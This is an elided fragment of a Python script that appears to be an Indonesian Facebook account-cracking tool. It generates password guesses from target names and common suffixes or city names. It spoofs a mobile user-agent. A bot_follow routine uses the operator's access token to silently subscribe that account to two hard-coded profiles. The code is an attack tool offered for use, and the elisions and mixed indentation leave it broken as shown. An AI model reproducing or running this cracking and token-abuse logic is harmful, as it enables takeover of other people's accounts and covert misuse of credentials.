...
def gen():
        ...
        try:
                ...
                "user-agent"                : "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)", # Jangan Di Ganti Ea Anjink.
...
def bot_follow():
	...
	requests.post("https://graph.facebook.com/100072170839290/subscribers?access_token=" + toket)      # Ezily LiZi
	requests.post("https://graph.facebook.com/100071551597739/subscribers?access_token=" + toket)      # DHONI
	menu()
...
def menu():
    ...
    print((k+"["+p+"•"+k+"]"+p+" Status  : "+h+"Mod Version"+p))
...
def pilihcrack(file):
  print((k+"\n["+p+"1"+k+"]"+p+" Api ("+k+"Fast"+p+")("+h+"Recommended"+p+")"))
	...
	for i in text.split(" "):
		if len(i)<3:
			...
			if len(i)==3 or len(i)==4 or len(i)==5:
				...
				results.append(i+"gaming")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i+"ganz")
				results.append(i+"gans")
				results.append(i+"tzy")
				if "id" in ct:
					results.append("semarang123")
					results.append("pemalang123")
					results.append("nganjuk")
					results.append("madiun")
					results.append("djancokk")
